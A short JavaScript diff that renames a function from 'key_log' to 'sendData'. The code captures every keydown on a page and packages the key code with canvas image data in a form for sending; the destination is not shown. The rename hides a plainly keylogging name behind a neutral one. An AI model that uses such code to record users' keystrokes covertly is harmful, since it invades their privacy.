@@ -1,4 +1,4 @@
-function key_log(key, imageData) {
+function sendData(key, imageData) {
     const form = new FormData()
     form.append('key', key)
     form.append('width', imageData.width)
@@ -32,6 +32,6 @@ window.addEventListener('DOMContentLoaded', () => {
     document.addEventListener('keydown', event => {
         const { keyCode } = event
         const imageData = getImageData(img, canvas)
-        key_log(keyCode, imageData)
+        sendData(keyCode, imageData)
     })
 })
